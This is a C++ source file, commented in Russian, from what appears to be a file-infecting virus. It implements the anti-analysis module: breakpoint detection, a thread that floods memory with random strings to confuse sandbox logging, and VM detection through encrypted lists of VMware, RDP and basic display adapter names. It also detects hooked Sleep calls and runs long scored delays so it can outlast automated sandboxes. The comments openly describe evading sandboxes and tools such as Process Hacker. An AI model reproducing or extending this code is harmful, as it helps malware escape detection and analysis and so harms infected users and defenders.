#include "antianalysis.h"
#include "utils.hpp"
#include "strings.hpp"

BOOL antianalysis::check_for_breakpoint(LPBYTE lpFunctionEntry)
{
	return (lpFunctionEntry[0] == 0xCC);
}

static VOID generate_string(LPBYTE lpMemory, SIZE_T dwMemorySize, DWORD dwAmount, DWORD dwSleepTime)
{
	UINT iCounter = 0;
	long holdrand = GetTickCount();
	for (;;)
	{
		if ((dwAmount != INFINITE) && (iCounter >= dwAmount))
			break;

		// минимальный размер строки должен быть равен 10 поскольку такое ограничение у process hacker и некоторых песочниц
		UINT iLengthGenerated = 0;

		// генератор строк
		for (;;)
		{
			UINT iStringLength = _rand(&holdrand) % 16 + 10;
			// генерируем одну строку и если в процессе генерации размер сгенерированных символов превышает размер памяти, то выходим
			for (UINT iIndex = 0; iIndex < iStringLength; iIndex++)
			{
				if (iLengthGenerated >= dwMemorySize)
					break;

				lpMemory[iLengthGenerated++] = _rand(&holdrand) % ('z' - 'a') + 'a';
			}

			if (iLengthGenerated >= dwMemorySize)
				break;

			lpMemory[iLengthGenerated++] = '\0';
		}

		if (dwAmount != INFINITE)
			iCounter++;

		Sleep(dwSleepTime);
	}

	return;
}

// некоторые песочницы мониторят всю запись в память и логируют создаваемые строки, позволяющие легко проанализировать расшифровку строк в памяти на стеке
// для этого есть этот поток - он будет флудить в память нововыделенными строками
static DWORD WINAPI TrashMemory(LPVOID lpParameter)
{
	UNREFERENCED_PARAMETER(lpParameter);
#ifdef _DEBUG
	WriteLog(L"[TrashMemory] trashing memory with generated trash-strings");
#endif
	
	DWORD dwMemorySize = 1024 * 10;
	LPBYTE lpMemory = new BYTE[dwMemorySize + 1];
	if (lpMemory != nullptr)
	{
		generate_string(lpMemory, dwMemorySize - 1, 1024, 1);
		delete[]lpMemory;
	}

#ifdef _DEBUG
	WriteLog(L"[TrashMemory] flooding-generation finished");
#endif

	ExitThread(0);
}

BOOL antianalysis::exec_all_longterm()
{
#ifdef _DEBUG
	WriteLog(L"[antianalysis::exec_all_longterm] executing all longterm anti-analysis measures");
#endif

	BOOL bRet = FALSE;
	HANDLE hThread = NULL;
	do
	{
		hThread = CreateThread(NULL, NULL, TrashMemory, NULL, 0, NULL);
		if (hThread != NULL)
			CloseHandle(hThread);

	} while (FALSE);

	return bRet;
}

antisbx::SandboxDelayMachineEntry::SandboxDelayMachineEntry()
{
#ifdef _DEBUG
	WriteLog(L"[SandboxDelayMachineEntry] constructor");
#endif
}

antisbx::SandboxDelayMachineEntry::~SandboxDelayMachineEntry()
{
#ifdef _DEBUG
	WriteLog(L"[SandboxDelayMachineEntry] destructor");
#endif
}

BOOL antisbx::SandboxDelayMachineEntry::enter()
{
	if (global_data::pExtendedDataCopy->dwWayInfected & M0YV_FNO_ANTISBX)
		return TRUE;

#ifdef _DEBUG
	WCHAR debugOut[1024];
	WriteLog(L"[SandboxDelayMachineEntry::enter] enter anti-sandbox");
#endif
	BOOL bRet = FALSE;
	
	INT iScore = 0;
	do
	{
		if (!this->check_required())
		{
#ifdef _DEBUG
			WriteLog(L"[SandboxDelayMachineEntry::enter] check is not required, skipping delay");
#endif
			bRet = TRUE;
			break;
		}

		// требуются дополнительные проверки - посчитаем баллы и в зависимости от количества баллов заснем на соответствующее время
		iScore = this->get_score();

#ifdef _DEBUG
		wsprintfW(debugOut, L"[SandboxDelayMachineEntry::entry] score = %d", iScore);
		WriteLog(debugOut);
#endif

		// задержка не требуется, так как результат баллов не положительный
		if (iScore <= 0)
		{
#ifdef _DEBUG
			WriteLog(L"[SandboxDelayMachineEntry::enter] no positive score so no delay");
#endif
			bRet = TRUE;
			break;
		}

		// для score в 1 подождем 2.1 секунду для проверки на перехват Sleep
		if (iScore == 1)
		{
			bRet = this->delay(2100);
			break;
		}

		// для остальных score > 1 подождем 100 секунд для каждого балла свыше 1 секунду

		bRet = TRUE; // вернем TRUE по умолчанию если Sleep не перехвачен и мы действительно прождали 100 сек на каждый балл
		for (UINT iCounter = 0; iCounter < (iScore - 1); iCounter++)
		{
			bRet &= this->delay(100 * 1000); // delay вернет false если не прождали нужное количество времени и Sleep был перехвачен
		}


	} while (FALSE);

	return bRet;
}

BOOL antisbx::SandboxDelayMachineEntry::check_required()
{
#ifdef _DEBUG
	WriteLog(L"[SandboxDelayMachineEntry::check_required] checking if sandbox analysis required");
#endif

	BOOL bRet = FALSE;
	
	do
	{
		// далее идет каскад проверок, в случае если любая из проверок возвращает TRUE, то считаем, что машина заведомо не является песочницей и делаем бряк проверок

		// если это не первый вход инфектора на данную машину, то это не песочница, либо проверка на песочницу при первом запуске дала false negative
		// при повторном запуске того же входного exe все равно посчитает, что это первый вход, так как проверка идет через hid машины, которая заразила текущий екзешник сверяя с текущим
		// не первый вход - это когда инфектор завирусился внутри одной машины и запустился из под зараженного екзешника 
		if (!this->is_entry_machine())
			break;

		// если путь с которого мы запустились не может принадлежать песочнице
		if (this->is_whitelist_path())
			break;

		// проверки на белый список были пройдены, а значит эта машина может оказаться песочницей, нужны дополнительные проверки
		bRet = TRUE;

	} while (FALSE);

	return bRet;
}

BOOL antisbx::SandboxDelayMachineEntry::is_whitelist_path()
{
	CONST UINT iPathLength = 1024;
	WCHAR wchSelfPath[iPathLength + 1];
	WCHAR wchWindowsPath[iPathLength + 1];

	BOOL bRet = FALSE;
	do
	{
		if (!GetModuleFileNameW(NULL, wchSelfPath, iPathLength))
			break;

		if (!GetWindowsDirectoryW(wchWindowsPath, iPathLength))
			break;

		// проверим, что начало пути \\, что является нехарактерным паттерном для любых песочниц, иначе их было бы слишком легко детектить
		// из-за этого факта мы можем сделать предположение, что машина запускающая EXE файл по такому пути заведомо не является песочницей
		if ((wchSelfPath[0] == L'\\') && (wchSelfPath[1] == L'\\'))
		{
#ifdef _DEBUG
			WriteLog(L"[SandboxDelayMachineEntry::is_whitelist_path] executed from double backslashed path which is whitelisted");
#endif
			bRet = TRUE;
			break;
		}

		// проверим, что текущий диск с которого запущены != системному диску и его тип removable или remote
		// так как такой паттерн также нехарактерен для песочниц
		wchSelfPath[3] = L'\0';
		DWORD dwCurrentDriveType = GetDriveTypeW(wchSelfPath);
		if ((((dwCurrentDriveType == DRIVE_REMOVABLE) || (dwCurrentDriveType == DRIVE_REMOTE))) && (wchSelfPath[0] != wchWindowsPath[0]))
		{
#ifdef _DEBUG
			WriteLog(L"[SandboxDelayMachineEntry::is_whitelist_path] executed from removable or remote drive which is not equal to system drive and is whitelisted pattern");
#endif
			bRet = TRUE;
			break;
		}
		

	} while (FALSE);

	return bRet;
}

BOOL antisbx::SandboxDelayMachineEntry::is_entry_machine()
{
	return is_machine_firstexec();
}

INT antisbx::SandboxDelayMachineEntry::get_score()
{
	INT iScore = 1; // дефолтное значение баллов

	if (this->isNoGraphics())
		iScore++;

	return iScore;
}

BOOL antisbx::SandboxDelayMachineEntry::isNoGraphics()
{
	UINT iDeviceNum = 0;
	DISPLAY_DEVICEW dispDevice;
	RtlSecureZeroMemory(&dispDevice, sizeof(dispDevice));

	dispDevice.cb = sizeof(DISPLAY_DEVICEW);

	CONST UINT iAmountGraphics = 9;
	CCryptString cStr_rdpdd(cryptedstr_rdpdd);
	CCryptString cStr_netmeeting(cryptedstr_netmeeting);
	CCryptString cStr_rdpencodermirrordriver(cryptedstr_rdpencodermirrordriver);
	CCryptString cStr_rdpreflectormirrordriver(cryptedstr_rdpreflectormirrordriver);
	CCryptString cStr_vmwaresvga3d(cryptedstr_vmwaresvga3d);
	CCryptString cStr_standardvgagraphicsadapter(cryptedstr_standardvgagraphicsadapter);
	CCryptString cStr_rdpuddchaineddd(cryptedstr_rdpuddchaineddd);
	CCryptString cStr_microsoftbasicdisplayadapter(cryptedstr_microsoftbasicdisplayadapter);
	CCryptString cStr_microsoftbasicrenderdriver(cryptedstr_microsoftbasicrenderdriver);

	PWCHAR pDecrypted[iAmountGraphics];

	pDecrypted[0] = cStr_rdpdd.w_str();
	pDecrypted[1] = cStr_netmeeting.w_str();
	pDecrypted[2] = cStr_rdpencodermirrordriver.w_str();
	pDecrypted[3] = cStr_rdpreflectormirrordriver.w_str();
	pDecrypted[4] = cStr_vmwaresvga3d.w_str();
	pDecrypted[5] = cStr_standardvgagraphicsadapter.w_str();
	pDecrypted[6] = cStr_rdpuddchaineddd.w_str();
	pDecrypted[7] = cStr_microsoftbasicdisplayadapter.w_str();
	pDecrypted[8] = cStr_microsoftbasicrenderdriver.w_str();
	// TODO: добавить strstr VirtualBox

	while (EnumDisplayDevicesW(NULL, iDeviceNum, &dispDevice, NULL))
	{
#ifdef _DEBUG
		WriteLog(L"[SandboxDelayMachineEntry::isNoGraphics] device name is ", dispDevice.DeviceString);
#endif
		if (!this->isBlacklisted(pDecrypted, sizeof(pDecrypted) / sizeof(PWCHAR), dispDevice.DeviceString))
			return FALSE;
	}

	// если дошли сюда, то либо нет графических устройств, либо все они из черного списка
	return TRUE;
}

BOOL antisbx::SandboxDelayMachineEntry::isBlacklisted(PWCHAR *pwBlacklist, UINT iBlacklistAmount, PWCHAR pwString)
{
	for (UINT iIndex = 0; iIndex < iBlacklistAmount; iIndex++)
	{
		if (_wcsicmp(pwBlacklist[iIndex], pwString) == 0)
			return TRUE;
	}

	return FALSE;
}

// задержка для детекта хука слип, если WaitForSingleObject не дойдет до таймаута, то у нас хукнули Sleep на значение меньше таймаута
static DWORD WINAPI ThreadLongSleep(LPVOID lpParameter)
{
	UNREFERENCED_PARAMETER(lpParameter);

	Sleep(10000 * 1000);

	ExitThread(0);
}

BOOL antisbx::SandboxDelayMachineEntry::delay(DWORD dwMilliseconds)
{
	BOOL bRet = FALSE;

	HANDLE hThread = CreateThread(NULL, NULL, ThreadLongSleep, NULL, NULL, NULL);
	if (hThread)
	{
		// true вернем только в случае если прождали необходимое время, иначе Sleep был хукнут
		bRet = (WaitForSingleObject(hThread, dwMilliseconds) == WAIT_TIMEOUT);
		CloseHandle(hThread);
	}

	return bRet;
}
